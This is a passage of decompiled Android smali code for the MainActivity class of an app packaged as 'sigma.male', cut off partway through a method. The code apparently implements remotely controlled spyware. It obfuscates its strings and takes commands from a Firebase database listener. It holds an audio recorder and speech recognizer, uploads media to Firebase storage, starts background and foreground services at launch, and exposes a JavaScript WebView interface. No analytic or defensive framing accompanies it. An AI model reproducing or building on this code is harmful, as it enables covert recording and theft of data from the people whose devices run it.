.class public Lsigma/male/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lsigma/male/MainActivity$WebAppInterface;
    }
.end annotation


# static fields
.field public static lajj:Ljava/lang/String;

.field public static pref:Landroid/content/SharedPreferences;


# instance fields
.field private _fbdb_child_listener:Lcom/google/firebase/database/ChildEventListener;

.field private _fbs_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

.field private _fbs_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _fbs_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnSuccessListener",
            "<",
            "Lcom/google/firebase/storage/FileDownloadTask$TaskSnapshot;",
            ">;"
        }
    .end annotation
.end field

.field private _fbs_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

.field private _fbs_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _fbs_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnCompleteListener",
            "<",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field private _firebase:Lcom/google/firebase/database/FirebaseDatabase;

.field private _firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

.field private _mediaup_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

.field private _mediaup_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _mediaup_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnSuccessListener",
            "<",
            "Lcom/google/firebase/storage/FileDownloadTask$TaskSnapshot;",
            ">;"
        }
    .end annotation
.end field

.field private _mediaup_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

.field private _mediaup_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _mediaup_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnCompleteListener",
            "<",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field private _rn_request_listener:Lsigma/male/RequestNetwork$RequestListener;

.field private _sigmamale_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

.field private _sigmamale_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _sigmamale_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnSuccessListener",
            "<",
            "Lcom/google/firebase/storage/FileDownloadTask$TaskSnapshot;",
            ">;"
        }
    .end annotation
.end field

.field private _sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

.field private _sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnCompleteListener",
            "<",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field private _timer:Ljava/util/Timer;

.field private cal:Ljava/util/Calendar;

.field private cmdn:Ljava/lang/String;

.field private cmdv:Ljava/lang/String;

.field private cmdvar:Ljava/lang/String;

.field private cmdvar2:Ljava/lang/String;

.field private fbdb:Lcom/google/firebase/database/DatabaseReference;

.field private fbs:Lcom/google/firebase/storage/StorageReference;

.field private filinfodat:Ljava/lang/String;

.field private ka:Landroid/content/Intent;

.field private lst:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private map:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/Object;",
            ">;>;"
        }
    .end annotation
.end field

.field private mediaup:Lcom/google/firebase/storage/StorageReference;

.field private mp:Landroid/media/MediaPlayer;

.field private myAudioRecorder:Landroid/media/MediaRecorder;

.field private num:D

.field private responsetxt:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/Object;",
            ">;"
        }
    .end annotation
.end field

.field private rn:Lsigma/male/RequestNetwork;

.field private sigmamale:Lcom/google/firebase/storage/StorageReference;

.field private sp:Landroid/content/SharedPreferences;

.field private st:Landroid/speech/SpeechRecognizer;

.field private str:Ljava/lang/String;

.field private t:Ljava/util/TimerTask;

.field private textview1:Landroid/widget/TextView;

.field private tts:Landroid/speech/tts/TextToSpeech;

.field private vbs:Landroid/os/Vibrator;

.field private webview1:Landroid/webkit/WebView;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 95
    const-string v0, ""

    sput-object v0, Lsigma/male/MainActivity;->lajj:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .prologue
    .line 88
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    .line 90
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->_timer:Ljava/util/Timer;

    .line 91
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    .line 92
    invoke-static {}, Lcom/google/firebase/storage/FirebaseStorage;->getInstance()Lcom/google/firebase/storage/FirebaseStorage;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    .line 96
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    .line 97
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/MainActivity;->cmdn:Ljava/lang/String;

    .line 98
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/MainActivity;->cmdvar:Ljava/lang/String;

    .line 99
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/MainActivity;->cmdv:Ljava/lang/String;

    .line 100
    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lsigma/male/MainActivity;->num:D

    .line 101
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/MainActivity;->str:Ljava/lang/String;

    .line 102
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/MainActivity;->filinfodat:Ljava/lang/String;

    .line 104
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/MainActivity;->cmdvar2:Ljava/lang/String;

    .line 106
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->map:Ljava/util/ArrayList;

    .line 107
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->lst:Ljava/util/ArrayList;

    .line 112
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    const-string v1, "ICcjXw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->fbdb:Lcom/google/firebase/database/DatabaseReference;

    .line 114
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    const-string v1, "JzspWQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/FirebaseStorage;->getReference(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->fbs:Lcom/google/firebase/storage/StorageReference;

    .line 123
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    const-string v1, "ICcjXxc="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/FirebaseStorage;->getReference(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->sigmamale:Lcom/google/firebase/storage/StorageReference;

    .line 136
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    const-string v1, "ODEiRFl6"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/FirebaseStorage;->getReference(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->mediaup:Lcom/google/firebase/storage/StorageReference;

    .line 144
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->cal:Ljava/util/Calendar;

    .line 145
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->ka:Landroid/content/Intent;

    .line 88
    return-void
.end method

.method static synthetic access$0(Lsigma/male/MainActivity;)Landroid/widget/TextView;
    .locals 1

    .prologue
    .line 109
    iget-object v0, p0, Lsigma/male/MainActivity;->textview1:Landroid/widget/TextView;

    return-object v0
.end method

.method static synthetic access$1(Lsigma/male/MainActivity;)Landroid/content/Intent;
    .locals 1

    .prologue
    .line 145
    iget-object v0, p0, Lsigma/male/MainActivity;->ka:Landroid/content/Intent;

    return-object v0
.end method

.method static synthetic access$10(Lsigma/male/MainActivity;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 99
    iput-object p1, p0, Lsigma/male/MainActivity;->cmdv:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$11(Lsigma/male/MainActivity;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 98
    iput-object p1, p0, Lsigma/male/MainActivity;->cmdvar:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$12(Lsigma/male/MainActivity;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 104
    iput-object p1, p0, Lsigma/male/MainActivity;->cmdvar2:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$13(Lsigma/male/MainActivity;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 97
    iget-object v0, p0, Lsigma/male/MainActivity;->cmdn:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$14(Lsigma/male/MainActivity;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 99
    iget-object v0, p0, Lsigma/male/MainActivity;->cmdv:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$15(Lsigma/male/MainActivity;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 98
    iget-object v0, p0, Lsigma/male/MainActivity;->cmdvar:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$16(Lsigma/male/MainActivity;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 104
    iget-object v0, p0, Lsigma/male/MainActivity;->cmdvar2:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$17(Lsigma/male/MainActivity;)Landroid/media/MediaRecorder;
    .locals 1

    .prologue
    .line 103
    iget-object v0, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    return-object v0
.end method

.method static synthetic access$18(Lsigma/male/MainActivity;Landroid/media/MediaRecorder;)V
    .locals 0

    .prologue
    .line 103
    iput-object p1, p0, Lsigma/male/MainActivity;->myAudioRecorder:Landroid/media/MediaRecorder;

    return-void
.end method

.method static synthetic access$19(Lsigma/male/MainActivity;)Lcom/google/firebase/storage/StorageReference;
    .locals 1

    .prologue
    .line 136
    iget-object v0, p0, Lsigma/male/MainActivity;->mediaup:Lcom/google/firebase/storage/StorageReference;

    return-object v0
.end method

.method static synthetic access$2(Lsigma/male/MainActivity;)Landroid/webkit/WebView;
    .locals 1

    .prologue
    .line 110
    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    return-object v0
.end method

.method static synthetic access$20(Lsigma/male/MainActivity;)Lcom/google/android/gms/tasks/OnFailureListener;
    .locals 1

    .prologue
    .line 142
    iget-object v0, p0, Lsigma/male/MainActivity;->_mediaup_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    return-object v0
.end method

.method static synthetic access$21(Lsigma/male/MainActivity;)Lcom/google/firebase/storage/OnProgressListener;
    .locals 1

    .prologue
    .line 140
    iget-object v0, p0, Lsigma/male/MainActivity;->_mediaup_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    return-object v0
.end method

.method static synthetic access$22(Lsigma/male/MainActivity;)Lcom/google/android/gms/tasks/OnCompleteListener;
    .locals 1

    .prologue
    .line 137
    iget-object v0, p0, Lsigma/male/MainActivity;->_mediaup_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    return-object v0
.end method

.method static synthetic access$3(Lsigma/male/MainActivity;)Ljava/util/HashMap;
    .locals 1

    .prologue
    .line 96
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    return-object v0
.end method

.method static synthetic access$4(Lsigma/male/MainActivity;Ljava/util/HashMap;)V
    .locals 0

    .prologue
    .line 96
    iput-object p1, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    return-void
.end method

.method static synthetic access$5(Lsigma/male/MainActivity;)Lcom/google/firebase/database/FirebaseDatabase;
    .locals 1

    .prologue
    .line 91
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    return-object v0
.end method

.method static synthetic access$6(Lsigma/male/MainActivity;)Landroid/content/SharedPreferences;
    .locals 1

    .prologue
    .line 122
    iget-object v0, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    return-object v0
.end method

.method static synthetic access$7(Lsigma/male/MainActivity;Ljava/util/Calendar;)V
    .locals 0

    .prologue
    .line 144
    iput-object p1, p0, Lsigma/male/MainActivity;->cal:Ljava/util/Calendar;

    return-void
.end method

.method static synthetic access$8(Lsigma/male/MainActivity;)Ljava/util/Calendar;
    .locals 1

    .prologue
    .line 144
    iget-object v0, p0, Lsigma/male/MainActivity;->cal:Ljava/util/Calendar;

    return-object v0
.end method

.method static synthetic access$9(Lsigma/male/MainActivity;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 97
    iput-object p1, p0, Lsigma/male/MainActivity;->cmdn:Ljava/lang/String;

    return-void
.end method

.method private initialize(Landroid/os/Bundle;)V
    .locals 3

    .prologue
    const/4 v2, 0x1

    const/4 v1, 0x0

    .line 180
    const-string v0, "ID0i"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v1}, Lsigma/male/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, Lsigma/male/MainActivity;->pref:Landroid/content/SharedPreferences;

    .line 181
    const v0, 0x7f0801a8

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lsigma/male/MainActivity;->textview1:Landroid/widget/TextView;

    .line 182
    const v0, 0x7f0801c6

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    .line 183
    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 184
    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 185
    const-string v0, "ID0i"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v1}, Lsigma/male/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    .line 186
    const-string v0, "Iz0kX1khOzQ="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/Vibrator;

    iput-object v0, p0, Lsigma/male/MainActivity;->vbs:Landroid/os/Vibrator;

    .line 187
    new-instance v0, Landroid/speech/tts/TextToSpeech;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Landroid/speech/tts/TextToSpeech;-><init>(Landroid/content/Context;Landroid/speech/tts/TextToSpeech$OnInitListener;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->tts:Landroid/speech/tts/TextToSpeech;

    .line 188
    invoke-static {p0}, Landroid/speech/SpeechRecognizer;->createSpeechRecognizer(Landroid/content/Context;)Landroid/speech/SpeechRecognizer;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/MainActivity;->st:Landroid/speech/SpeechRecognizer;

    .line 189
    new-instance v0, Lsigma/male/RequestNetwork;

    invoke-direct {v0, p0}, Lsigma/male/RequestNetwork;-><init>(Landroid/app/Activity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->rn:Lsigma/male/RequestNetwork;

    .line 191
    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    new-instance v1, Lsigma/male/MainActivity$1;

    invoke-direct {v1, p0}, Lsigma/male/MainActivity$1;-><init>(Lsigma/male/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 226
    new-instance v0, Lsigma/male/MainActivity$2;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$2;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_fbdb_child_listener:Lcom/google/firebase/database/ChildEventListener;

    .line 263
    iget-object v0, p0, Lsigma/male/MainActivity;->fbdb:Lcom/google/firebase/database/DatabaseReference;

    iget-object v1, p0, Lsigma/male/MainActivity;->_fbdb_child_listener:Lcom/google/firebase/database/ChildEventListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->addChildEventListener(Lcom/google/firebase/database/ChildEventListener;)Lcom/google/firebase/database/ChildEventListener;

    .line 265
    new-instance v0, Lsigma/male/MainActivity$3;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$3;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_fbs_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 273
    new-instance v0, Lsigma/male/MainActivity$4;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$4;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_fbs_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 281
    new-instance v0, Lsigma/male/MainActivity$5;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$5;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_fbs_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    .line 289
    new-instance v0, Lsigma/male/MainActivity$6;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$6;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_fbs_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 297
    new-instance v0, Lsigma/male/MainActivity$7;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$7;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_fbs_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 304
    new-instance v0, Lsigma/male/MainActivity$8;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$8;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_fbs_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    .line 312
    new-instance v0, Lsigma/male/MainActivity$9;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$9;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 320
    new-instance v0, Lsigma/male/MainActivity$10;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$10;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_sigmamale_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 328
    new-instance v0, Lsigma/male/MainActivity$11;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$11;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    .line 336
    new-instance v0, Lsigma/male/MainActivity$12;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$12;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_sigmamale_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 344
    new-instance v0, Lsigma/male/MainActivity$13;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$13;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_sigmamale_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 351
    new-instance v0, Lsigma/male/MainActivity$14;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$14;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    .line 359
    new-instance v0, Lsigma/male/MainActivity$15;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$15;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_mediaup_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 367
    new-instance v0, Lsigma/male/MainActivity$16;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$16;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_mediaup_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 375
    new-instance v0, Lsigma/male/MainActivity$17;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$17;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_mediaup_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    .line 396
    new-instance v0, Lsigma/male/MainActivity$18;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$18;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_mediaup_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 404
    new-instance v0, Lsigma/male/MainActivity$19;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$19;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_mediaup_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 411
    new-instance v0, Lsigma/male/MainActivity$20;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$20;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_mediaup_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    .line 419
    new-instance v0, Lsigma/male/MainActivity$21;

    invoke-direct {v0, p0}, Lsigma/male/MainActivity$21;-><init>(Lsigma/male/MainActivity;)V

    iput-object v0, p0, Lsigma/male/MainActivity;->_rn_request_listener:Lsigma/male/RequestNetwork$RequestListener;

    .line 436
    return-void
.end method

.method private initializeLogic()V
    .locals 5

    .prologue
    const v4, 0x7f0801c6

    const/4 v3, 0x1

    .line 439
    iget-object v0, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    const-string v1, "ID0i"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 440
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lsigma/male/servicess;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 441
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lsigma/male/ForegroundService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 442
    invoke-virtual {p0}, Lsigma/male/MainActivity;->_pihtest()V

    .line 448
    :goto_0
    iget-object v0, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    const-string v1, "ID0i"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 449
    iget-object v0, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    const-string v1, "JTU1Xg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ZGZ1"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 453
    :cond_0
    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/webkit/WebSettings;->setDatabaseEnabled(Z)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x13

    if-ge v0, v1, :cond_1

    iget-object v0, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ejAnWVl6MCdZWXo="

